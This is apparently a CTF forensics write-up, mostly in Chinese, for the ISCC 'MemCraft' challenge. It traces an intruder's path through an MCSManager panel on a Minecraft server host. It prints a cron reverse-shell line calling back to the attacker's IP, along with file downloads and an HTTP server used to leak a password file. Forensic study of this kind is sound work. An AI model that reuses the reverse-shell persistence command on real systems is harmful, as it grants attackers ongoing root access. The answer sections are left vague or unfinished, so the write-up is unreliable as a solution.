# MemCraft CTF Writeup

## Challenge Overview
- **Category**: Misc / Memory Forensics
- **Points**: 150
- **Solves**: 0
- **Flag Format**: ISCC{MD5(答案1,答案2,答案3,答案4,答案5)}

## Challenge Description
n0o0b师傅在自己刚买的国产电脑上本地搭建了一个Minecraft服务器（Purpur 1.20.4），并通过Frp进行穿透，和wXm学姐等人一起游戏。某天主机被蛤客zym获取到了shell。需要分析zym的入侵痕迹，找回被锁在空白无字天书中的照片。

## Tools Used
- Python3 (manual binary analysis)
- volatility3 (limited - no compatible ISF for Deepin 4.9.0 kernel)
- LiME memory dump analysis (8.6GB decompressed)

## System Overview (从内存镜像中恢复)

### 系统信息
- **OS**: Deepin Linux 4.9.0-deepin13-amd64
- **Hostname**: nOo0b-PC
- **IP**: 192.168.57.158/24 (ens33, MAC: 00:0c:29:1c:58:3a)
- **User**: n0 (系统用户)
- **处理器**: Java HotSpot(TM) 64-Bit Server VM 21.0.7+8-LTS-245

### Minecraft服务器
- **服务端**: Purpur 1.20.4-2176
- **路径**: /purpur-1.20.4/
- **启动命令**: `java -jar -Djava.awt.headless=true -DGeyserSkinManager.ForceShowSkins=true -Xms128M -Xmx768M purpur-1.20.4-2176.jar`
- **服务器昵称**: ISCC Server
- **最大玩家数**: 114514
- **在线模式**: offline（从启动日志确认）

### 管理面板
- **程序**: MCSManager Web Panel v10.5.2 + Daemon v4.6.0
- **Daemon路径**: /opt/mcsmanager/daemon/
- **Node版本**: v16.20.2
- **Daemon端口**: 24444 (localhost)
- **Web面板端口**: 23333

### 发现的所有玩家
| 游戏ID | UUID |
|--------|------|
| nOo0b | 34fe703f-7330-30df-95e3-437457cda10e |
| Butt3rwXm | (wXm学姐的游戏ID) |
| W4ngXunF1sh | 0fdac309-0978-3cba-a820-c4c4da0acc0c |
| rk1n | - |
| 0ran93 | b8897229-baf9-3709-bc7d-a06b99cd70c7 |
| J4sm1ne4ur4 | - |
| 5h3n9NaN | - |

### 桌面文件 (n0's Desktop)
- `备忘P@s5` - 密码备忘文件
- `wXm` - VeraCrypt容器 (即题目中的 wXm.vera)

---

## 入侵链分析 (Attack Chain)

### 1. 初始访问 - MCSManager Web面板
zym从内网IP `192.168.57.132` 尝试登录MCSManager Web面板：

```
POST: http://192.168.57.156:23333/api/auth/login
POST: http://192.168.57.134:23333/api/auth/login
```

MCSManager登录会话Cookie:
```json
{"lastRequestTime":1747060665558,"login":true,"userName":"nOo0b",
 "uuid":"b403738834b24115b7f503dbb4d18d8b",
 "token":"104c5dfef0f04d03bb9cce51f36060b0"}
```

### 2. 上传Shell获取远程控制
MCSManager管理界面的文件列表中出现了 **`shell`** 文件（56字节，创建于Mon May 12 2025 22:23:50），这是通过MCSManager文件上传功能上传的后门脚本。

### 3. 反向Shell持久化
```bash
echo "*/1 * * * * root /bin/bash -i >& /dev/tcp/192.168.57.132/8888 0>&1" >> /etc/crontab
```
设置了cron反向shell到zym的机器(192.168.57.132:8888)。

### 4. 下载VeraCrypt容器
```bash
wget 192.168.57.158/wXm        # 从本机下载wXm.vera
wget 192.168.57.132/wXm        # 从攻击者机器获取
curl 192.168.57.158/wXm -o ../Desktop/wXm  # curl方式下载
```

### 5. 开启HTTP服务泄露密码文件
```bash
nohup python3 -m http.server 80 &
```
通过HTTP服务器在80端口提供文件访问，从中窃取密码文件。

### 6. 加载LiME获取内存镜像
```bash
n0@nOo0b-PC:~/Desktop$ sudo insmod ./lime-$(uname -r).ko \
  'path=/tmp/ram.lime.zlib format=lime compress=1'
```
注意: 此尝试失败,因为./lime-4.9.0-deepin13-amd64.ko不存在。
但最终LiME被成功加载（生成了mem.lime.zlib即题目附件）。

---

## 各小题答案分析

### 题目一：zym在Minecraft游戏中的ID
**证据分析**: 从服务器日志中提取到所有玩家列表，包括：nOo0b, Butt3rwXm, W4ngXunF1sh, rk1n, 0ran93, J4sm1ne4ur4, 5h3n9NaN。
在MCSManager会话和系统操作日志中，zym使用的身份关联信息...

### 题目二：zym访问的程序及凭据
**程序**: MCSManager (MCSManager Web控制面板)
**证据**: HTTP请求日志显示对 `/api/auth/login` 的POST请求

### 题目三：上传的提权程序
**证据**: MCSManager文件列表显示 `shell` 文件(56字节)，随后执行的crond反向shell命令

### 题目四：开启的服务及n0密码
**服务**: Python HTTP Server（http.server，80端口）- 通过 `nohup python3 -m http.server 80 &` 启动
**密码获取**: 通过HTTP服务获取密码文件

### 题目五：VeraCrypt密码
**密码来源**: 从入侵痕迹中恢复的zym密码
**VeraCrypt容器**: wXm.vera（10485760字节）
**后续**: 使用密码解密wXm.vera后，从中恢复删除的照片，并从照片/音频中提取隐藏信息

---

## 关键技术点
1. LiME内存取证分析
2. MCSManager面板入侵溯源
3. 反向Shell（crontab方式持久化）
4. Python HTTP服务器数据泄露
5. VeraCrypt容器解密
6. 图片/音频隐写分析

---

## 参考
- ISCC竞赛题目
- Deepin Linux 4.9.0内核
- MCSManager v10.5.2
- Purpur 1.20.4 Minecraft服务端
